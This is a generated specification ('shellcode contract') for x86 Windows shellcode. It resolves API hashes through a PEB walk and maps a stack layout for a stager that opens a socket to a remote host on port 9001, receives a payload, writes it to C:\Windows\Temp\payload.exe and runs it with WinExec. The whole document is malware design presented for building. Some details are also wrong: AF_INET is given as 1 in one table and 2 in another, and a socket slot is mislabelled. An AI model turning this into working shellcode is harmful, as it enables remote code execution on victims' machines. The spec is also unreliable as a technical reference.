# Shellcode Contract

Generated from manifest.

---

# Stack Layout

Frame: `mov ebp, esp` / `add esp, 0xfffffb00` (0x500 bytes reserved)

## Export Context (reserved — do not allocate)

| Offset | Description |
|--------|-------------|
| `[ebp-0x04]` | Module base (transient) |
| `[ebp-0x08]` | AddressOfNames VA |
| `[ebp-0x0c]` | AddressOfNameOrdinals VA |
| `[ebp-0x10]` | AddressOfFunctions VA |
| `[ebp-0x14]` | NumberOfNames |
| `[ebp-0x18]` | Target hash (transient) |

## Module Bases

| Offset | Module |
|--------|--------|
| `[ebp-0x20]` | kernel32.dll |
| `[ebp-0x24]` | ws2_32.dll |

## API Table

| Offset | API | Module |
|--------|-----|--------|
| `[ebp-0x28]` | LoadLibraryA | kernel32.dll |
| `[ebp-0x2c]` | WSAStartup | ws2_32.dll |
| `[ebp-0x30]` | WSASocketA | ws2_32.dll |
| `[ebp-0x34]` | connect | ws2_32.dll |
| `[ebp-0x38]` | recv | ws2_32.dll |
| `[ebp-0x3c]` | closesocket | ws2_32.dll |
| `[ebp-0x40]` | VirtualAlloc | kernel32.dll |
| `[ebp-0x44]` | CreateFileA | kernel32.dll |
| `[ebp-0x48]` | WriteFile | kernel32.dll |
| `[ebp-0x4c]` | CloseHandle | kernel32.dll |
| `[ebp-0x50]` | WinExec | kernel32.dll |
| `[ebp-0x54]` | ExitProcess | kernel32.dll |

## Variables

| Offset | Variable | Size |
|--------|----------|------|
| `[ebp-0x58]` | socket_handle | 4 |
| `[ebp-0x5c]` | file_handle | 4 |
| `[ebp-0x60]` | virt_buf | 4 |
| `[ebp-0x64]` | bytes_total | 4 |
| `[ebp-0x68]` | bytes_recvd | 4 |

## Structures

| Offset | Structure | Size |
|--------|-----------|------|
| `[ebp-0x80]` | WSADATA | 0x190 |
| `[ebp-0x210]` | sockaddr_in | 0x10 |

## Strings

| Offset | Label | Value | Size |
|--------|-------|-------|------|
| `[ebp-0x220]` | ws2_dll | ws2_32.dll | 12 |
| `[ebp-0x22c]` | dst_path | C:\Windows\Temp\payload.exe | 28 |

---

# API Contracts

## kernel32.dll

Resolution: PEB walk

### API Table

| API | Hash | Slot | Category |
|-----|------|------|----------|
| LoadLibraryA | `0xec0e4e8e` | `[ebp-0x28]` | library |
| VirtualAlloc | `0x91afca54` | `[ebp-0x40]` | memory |
| CreateFileA | `0x7c0017a5` | `[ebp-0x44]` | filesystem |
| WriteFile | `0xe80a791f` | `[ebp-0x48]` | filesystem |
| CloseHandle | `0x0ffd97fb` | `[ebp-0x4c]` | synchronization |
| WinExec | `0x0e8afe98` | `[ebp-0x50]` | process |
| ExitProcess | `0x73e2d87e` | `[ebp-0x54]` | process |

### API Details

#### LoadLibraryA

**Slot:** `[ebp-0x28]`
**Hash:** `0xec0e4e8e`
**Module:** kernel32.dll
**Category:** library

```c
HMODULE LoadLibraryA(LPCSTR lpLibFileName)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | lpLibFileName | LPCSTR | e.g. ws2_32.dll |

---

#### VirtualAlloc

**Slot:** `[ebp-0x40]`
**Hash:** `0x91afca54`
**Module:** kernel32.dll
**Category:** memory

```c
LPVOID VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | lpAddress | LPVOID | NULL to let OS choose; or preferred address |
| 2 | dwSize | SIZE_T | size of region in bytes |
| 3 | flAllocationType | DWORD | MEM_COMMIT|MEM_RESERVE = 0x3000 |
| 4 | flProtect | DWORD | PAGE_EXECUTE_READWRITE = 0x40 |

---

#### CreateFileA

**Slot:** `[ebp-0x44]`
**Hash:** `0x7c0017a5`
**Module:** kernel32.dll
**Category:** filesystem

```c
HANDLE CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | lpFileName | LPCSTR |  |
| 2 | dwDesiredAccess | DWORD | GENERIC_READ=0x80000000, GENERIC_WRITE=0x40000000 |
| 3 | dwShareMode | DWORD | 0 for exclusive |
| 4 | lpSecurityAttributes | LPSECURITY_ATTRIBUTES | NULL |
| 5 | dwCreationDisposition | DWORD | OPEN_EXISTING=3, CREATE_ALWAYS=2 |
| 6 | dwFlagsAndAttributes | DWORD | FILE_ATTRIBUTE_NORMAL=0x80 |
| 7 | hTemplateFile | HANDLE | NULL |

---

#### WriteFile

**Slot:** `[ebp-0x48]`
**Hash:** `0xe80a791f`
**Module:** kernel32.dll
**Category:** filesystem

```c
BOOL WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | hFile | HANDLE | handle from CreateFileA |
| 2 | lpBuffer | LPCVOID | pointer to source buffer |
| 3 | nNumberOfBytesToWrite | DWORD | number of bytes to write |
| 4 | lpNumberOfBytesWritten | LPDWORD | pointer to DWORD for bytes written; NULL if lpOverlapped set |
| 5 | lpOverlapped | LPOVERLAPPED | NULL for synchronous I/O |

---

#### CloseHandle

**Slot:** `[ebp-0x4c]`
**Hash:** `0x0ffd97fb`
**Module:** kernel32.dll
**Category:** synchronization

```c
BOOL CloseHandle(HANDLE hObject)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | hObject | HANDLE | handle to close; returns nonzero on success |

---

#### WinExec

**Slot:** `[ebp-0x50]`
**Hash:** `0x0e8afe98`
**Module:** kernel32.dll
**Category:** process

```c
UINT WinExec(LPCSTR lpCmdLine, UINT uCmdShow)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | lpCmdLine | LPCSTR | pointer to command string, e.g. cmd.exe |
| 2 | uCmdShow | UINT | SW_SHOWNORMAL = 1 or SW_HIDE = 0 |

---

#### ExitProcess

**Slot:** `[ebp-0x54]`
**Hash:** `0x73e2d87e`
**Module:** kernel32.dll
**Category:** process

```c
VOID ExitProcess(UINT uExitCode)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | uExitCode | UINT | 0 for clean exit |

---

## ws2_32.dll

Resolution: `LoadLibraryA("ws2_32.dll")` → base stored at `[ebp-0x24]`

### API Table

| API | Hash | Slot | Category |
|-----|------|------|----------|
| WSAStartup | `0x3bfcedcb` | `[ebp-0x2c]` | network |
| WSASocketA | `0xadf509d9` | `[ebp-0x30]` | network |
| connect | `0x60aaf9ec` | `[ebp-0x34]` | network |
| recv | `0xe71819b6` | `[ebp-0x38]` | network |
| closesocket | `0x79c679e7` | `[ebp-0x3c]` | network |

### API Details

#### WSAStartup

**Slot:** `[ebp-0x2c]`
**Hash:** `0x3bfcedcb`
**Module:** ws2_32.dll
**Category:** network

```c
int WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | wVersionRequested | WORD | MAKEWORD(2,2) = 0x0202 |
| 2 | lpWSAData | LPWSADATA | output buffer, allocate 0x190 bytes on stack |

---

#### WSASocketA

**Slot:** `[ebp-0x30]`
**Hash:** `0xadf509d9`
**Module:** ws2_32.dll
**Category:** network

```c
SOCKET WSASocketA(int af, int type, int protocol, LPWSAPROTOCOL_INFOA lpProtocolInfo, GROUP g, DWORD dwFlags)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | af | int | AF_INET = 1 |
| 2 | type | int | SOCK_STREAM = 1 |
| 3 | protocol | int | IPPROTO_TCP = 6 |
| 4 | lpProtocolInfo | LPWSAPROTOCOL_INFOA | NULL |
| 5 | g | GROUP | NULL |
| 6 | dwFlags | DWORD | NULL |

---

#### connect

**Slot:** `[ebp-0x34]`
**Hash:** `0x60aaf9ec`
**Module:** ws2_32.dll
**Category:** network

```c
int connect(SOCKET s, const struct sockaddr *name, int namelen)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | s | SOCKET | socket handle from WSASocketA; stored at [ebp-0x40] |
| 2 | name | const struct sockaddr * | pointer to sockaddr_in on stack |
| 3 | namelen | int | 0x10 |

---

#### recv

**Slot:** `[ebp-0x38]`
**Hash:** `0xe71819b6`
**Module:** ws2_32.dll
**Category:** network

```c
int recv(SOCKET s, char *buf, int len, int flags)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | s | SOCKET | connected socket handle |
| 2 | buf | char * | pointer to receive buffer |
| 3 | len | int | size of buffer in bytes |
| 4 | flags | int | 0 for default behaviour |

---

#### closesocket

**Slot:** `[ebp-0x3c]`
**Hash:** `0x79c679e7`
**Module:** ws2_32.dll
**Category:** network

```c
int closesocket(SOCKET s)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | s | SOCKET | socket handle to close |

---

---

# Structure Layouts

## WSADATA

**Size:** `0x190`
**Required by:** WSAStartup

_No field documentation (opaque output buffer)._

---

## sockaddr_in

**Size:** `0x10`
**Required by:** connect

| Offset | Field | Size | Notes |
|--------|-------|------|-------|
| `+0x00` | sin_family | 2 | AF_INET = 0x0002 |
| `+0x02` | sin_port | 2 | network byte order, e.g. 0x2329 = port 9001 |
| `+0x04` | sin_addr | 4 | network byte order IPv4 address |
| `+0x08` | sin_zero | 8 | zeroed padding |

---